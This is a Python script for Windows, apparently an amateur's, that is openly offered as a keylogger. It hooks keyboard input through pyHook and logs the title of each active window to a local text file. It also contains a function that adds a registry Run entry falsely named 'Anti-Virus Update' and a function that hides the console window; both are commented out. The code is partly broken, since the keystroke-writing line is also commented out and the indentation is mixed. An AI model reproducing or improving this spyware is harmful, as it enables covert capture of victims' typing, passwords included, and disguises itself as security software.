#!/usr/bin/python


import  time, datetime, os, sys 
import  subprocess, base64,platform
import pythoncom, pyHook, win32api, win32gui, win32con

time = 0
filename = 'HackedByRohit.txt'
active = ''
text = ""
state = False
date = datetime.datetime.now()

logfile = open(filename, 'a')

text += ' \t\t  ######################################  \n'
text += ' \t\t  ##    Proudly Made By An INDIAN     ##\n'
text += ' \t\t  ##   Author : Rohit Saxsena INDIA   ##\n'
text += ' \t\t  ##        Version : V0.1wK          ##\n'
text += ' \t\t  ######################################  \n'
logfile.write(text)
logfile.close()

def addtoregistry():
    hkey=win32api.RegCreateKey(win32con.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    win32api.RegSetValueEx(hkey,'Anti-Virus Update',0,win32con.REG_SZ,(os.getcwd()+"\\keylogger2.py"))
    win32api.RegCloseKey(hkey)

def stealth():
    
    stealth=win32gui.FindWindow("ConsoleWindowClass",None)
    win32gui.ShowWindow(stealth,0)

def log(time, filename):
    global text, logfile, state, active, main_thread_id
    state = True

    main_thread_id = win32api.GetCurrentThreadId()


    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

def OnKeyboardEvent(event):
    global text, logfile, filename, active
    text = ""
    logfile = open(filename, 'a')

    wg = win32gui
    newactive = wg.GetWindowText(wg.GetForegroundWindow())
    if newactive != active:
        text += " \n\n [*] Window activated. [" + str(date) + "] \n"
        text += "\t | " + newactive + " |\n"
	active = newactive
        logfile.write(text)
    text = ""
    if event.Ascii == 8: text += "\b"
    elif event.Ascii == 13 or event.Ascii == 9: text += "\n"
    else: text += str(chr(event.Ascii))
	
    #logfile.write(text) 
    logfile.close()
	
    return True

while True :

    #addtoregistry()
    #stealth()
    log(time, filename)
